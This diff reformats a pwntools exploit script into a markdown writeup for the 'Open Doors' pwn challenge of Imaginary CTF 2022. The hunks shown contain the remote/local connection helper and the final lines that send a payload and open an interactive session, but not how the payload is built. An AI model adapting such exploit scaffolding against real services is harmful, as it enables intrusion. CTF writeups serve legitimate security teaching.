@@ -1,5 +1,27 @@
-from pwn import *
+---
+name: Open Doors (2022)
+event: Imaginary CTF 2022
+category: Pwn
+description: Writeup for Open Doors (Pwn) - Imaginary CTF (2022) 💜
+layout:
+    title:
+        visible: true
+    description:
+        visible: true
+    tableOfContents:
+        visible: false
+    outline:
+        visible: true
+    pagination:
+        visible: true
+---
 
+# Open Doors
+
+## Solution
+
+```py
+from pwn import *
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
@@ -9,7 +31,6 @@ def start(argv=[], *a, **kw):
         return remote(sys.argv[1], sys.argv[2], *a, **kw)
     else:  # Run locally
         return process([exe] + argv, *a, **kw)
-
 
 # Specify GDB script here (breakpoints etc)
 gdbscript = '''
@@ -68,3 +89,4 @@ io.sendline(payload)
 
 # Flag??
 io.interactive()
+```
